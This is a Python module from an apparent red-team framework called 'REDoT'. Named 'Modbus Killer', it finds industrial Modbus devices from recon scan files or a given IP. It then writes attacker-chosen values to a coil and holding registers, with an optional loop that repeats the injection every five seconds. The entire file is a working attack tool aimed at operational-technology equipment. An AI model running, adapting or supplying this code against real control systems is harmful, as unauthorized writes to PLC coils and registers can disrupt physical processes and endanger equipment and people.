#!/usr/bin/env python3
# modules/attacks/modbus_killer.py
# REDoT Modbus Killer - OT Coil & Register Manipulation)

from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import os, time, json, argparse, random, signal, sys

AGENT_ID = "modbus_killer"
ALERT_FILE = "webgui/alerts.json"
RECON_PATHS = [
    "recon/modbus_targets.json",  # Preferred
    "recon/wifi_scan.json",
    "recon/ble_scan.json"
]

def log(msg):
    print(f"[MODBUS] {msg}")

def push_alert(message):
    os.makedirs(os.path.dirname(ALERT_FILE), exist_ok=True)
    alert = {
        "agent": AGENT_ID,
        "alert": message,
        "type": "ot_attack",
        "timestamp": time.time()
    }
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps(alert) + "\n")

def discover_target_ip():
    for path in RECON_PATHS:
        if not os.path.exists(path):
            continue
        try:
            with open(path) as f:
                data = json.load(f)
                for device in data.get("devices", []):
                    if "modbus" in device.get("services", []) or device.get("protocol") == "modbus":
                        return device["ip"]
        except Exception:
            continue
    return None

def modbus_payload(ip, verbose=False):
    try:
        client = ModbusTcpClient(ip)
        if not client.connect():
            log(f"Could not connect to {ip}")
            push_alert(f"Connection failed to Modbus target {ip}")
            return

        log(f"Connected to Modbus device at {ip}")
        push_alert(f"Injecting Modbus commands to {ip}")

        # Payload
        client.write_coil(0, True)
        client.write_register(1, 1337)
        rand_val = random.randint(2000, 6000)
        client.write_register(2, rand_val)

        if verbose:
            reg1 = client.read_holding_registers(1, 1)
            reg2 = client.read_holding_registers(2, 1)
            if not reg1.isError() and not reg2.isError():
                log(f"→ Verification: Register 1 = {reg1.registers[0]}, Register 2 = {reg2.registers[0]}")
            else:
                log("→ Verification failed: Unable to read registers.")

        log("Payload sent.")
        client.close()
    except ModbusIOException as e:
        log(f"Modbus exception: {e}")
        push_alert(f"Modbus error: {str(e)}")

def graceful_exit(sig, frame):
    log("Kill signal received. Exiting cleanly.")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Inject Modbus kill payloads")
    parser.add_argument("--target", help="Manual IP of Modbus device")
    parser.add_argument("--loop", action="store_true", help="Continuously repeat attack")
    parser.add_argument("--verbose", action="store_true", help="Enable register readback verification")
    args = parser.parse_args()

    ip = args.target or discover_target_ip()
    if not ip:
        log("❌ No Modbus target found via scan. Use --target <IP> manually.")
        return

    signal.signal(signal.SIGINT, graceful_exit)
    log(f"Targeting {ip}...")

    if args.loop:
        log("Loop mode enabled (5s delay). Ctrl+C to exit.")
        while True:
            modbus_payload(ip, verbose=args.verbose)
            time.sleep(5)
    else:
        modbus_payload(ip, verbose=args.verbose)

if __name__ == "__main__":
    main()
